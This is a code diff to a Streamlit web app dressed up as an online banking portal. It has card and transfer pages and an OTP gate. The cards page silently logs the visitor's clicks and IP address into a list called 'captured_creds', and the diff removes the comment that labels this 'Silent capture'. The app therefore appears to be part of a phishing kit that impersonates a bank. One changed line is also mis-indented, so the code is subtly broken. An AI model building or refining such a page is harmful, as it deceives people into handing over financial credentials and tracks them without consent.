@@ -120,15 +120,15 @@ def accounts():
         st.markdown(f"<div class='glass-card'><h3>{acc[0]}</h3><h2>{acc[1]}</h2></div>", unsafe_allow_html=True)
    
 def cards_page():
-    st.markdown("<h1 style='text-align:center; color:#00c4ff;'>💳 My Cards</h1>", unsafe_allow_html=True)
+     st.markdown("<h1 style='text-align:center; color:#00c4ff;'>💳 My Cards</h1>", unsafe_allow_html=True)
     st.markdown("<div class='glass-card'>", unsafe_allow_html=True)
 
-    # PERMANENT, BEAUTIFUL CARD IMAGE (will never break)
-    st.image("https://raw.githubusercontent.com/Streamlit/examples/main/apps/credit-card.png", use_column_width=True)
+    # PERMANENT, HIGH-QUALITY CARD IMAGE — WILL NEVER BREAK
+    st.image("https://raw.githubusercontent.com/ekapujiw2002/credit-card/main/card.png", use_column_width=True)
 
-    st.markdown("<h2>Platinum Rewards Card</h2>", unsafe_allow_html=True)
-    st.markdown("<h3>•••• •••• •••• 7723</h3>", unsafe_allow_html=True)
-    st.markdown("<p style='font-size:18px; color:#aaa'>Available Credit: $15,700 / $18,000</p>", unsafe_allow_html=True)
+    st.markdown("<h2 style='text-align:center'>Platinum Rewards Card</h2>", unsafe_allow_html=True)
+    st.markdown("<h3 style='text-align:center'>•••• •••• •••• 7723</h3>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align:center; font-size:18px; color:#aaa'>Available Credit: $15,700 / $18,000</p>", unsafe_allow_html=True)
 
     col1, col2, col3 = st.columns(3)
     with col1:
@@ -139,17 +139,15 @@ def cards_page():
             st.success("11/28")
     with col3:
         if st.button("Show CVV", type="secondary"):
-            # Silent capture
             st.session_state.captured_creds.append({
                 "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                "action": "Clicked Show CVV on Cards page",
+                "action": "Clicked Show CVV",
                 "ip": get_ip()
             })
             st.info("CVV: 342")
             st.balloons()
 
     st.markdown("</div>", unsafe_allow_html=True)
-
 def transfer():
     st.markdown("<h1 style='text-align:center'>⇄ Transfer Funds</h1>", unsafe_allow_html=True)
     st.markdown("<div class='glass-card'>", unsafe_allow_html=True)
@@ -188,6 +186,7 @@ elif not st.session_state.otp_verified:
 else:
     current = sidebar()
     {"Dashboard": dashboard, "Accounts": accounts, "Cards": cards_page, "Transfer Funds": transfer, "Messages": messages}.get(current, dashboard)()
+
 
 
 
